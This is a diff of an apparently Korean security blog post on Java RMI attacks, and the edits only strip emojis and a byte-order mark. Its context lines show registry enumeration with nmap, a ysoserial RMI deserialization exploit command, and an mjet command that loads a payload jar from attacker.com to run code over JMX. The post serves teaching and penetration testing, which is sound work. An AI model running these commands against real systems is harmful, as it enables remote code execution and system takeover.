@@ -1,4 +1,4 @@
-﻿---
+---
 layout: post
 title: "Java RMI"
 date: 2025-09-22
@@ -81,7 +81,7 @@ nmap -sV -p 1099 --script rmi-dumpregistry <target>
 # |     ...
 ```
 
-**[공격 결과]**: 등록된 객체 정보 노출 → 공격 벡터 파악 🔓
+**[공격 결과]**: 등록된 객체 정보 노출 → 공격 벡터 파악
 
 ---
 
@@ -110,7 +110,7 @@ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <target> 1099 Common
 # root
 ```
 
-**[공격 결과]**: 악성 직렬화 객체 → 원격 코드 실행 → 시스템 장악 🔓
+**[공격 결과]**: 악성 직렬화 객체 → 원격 코드 실행 → 시스템 장악
 
 ---
 
@@ -132,7 +132,7 @@ jconsole <target>:1099
 java -jar mjet.jar -m load -t <target> -p 1099 -u http://attacker.com/evil.jar -payload Exec 'id'
 ```
 
-**[공격 결과]**: JMX MBean을 통한 원격 코드 실행 🔓
+**[공격 결과]**: JMX MBean을 통한 원격 코드 실행
 
 ---
 
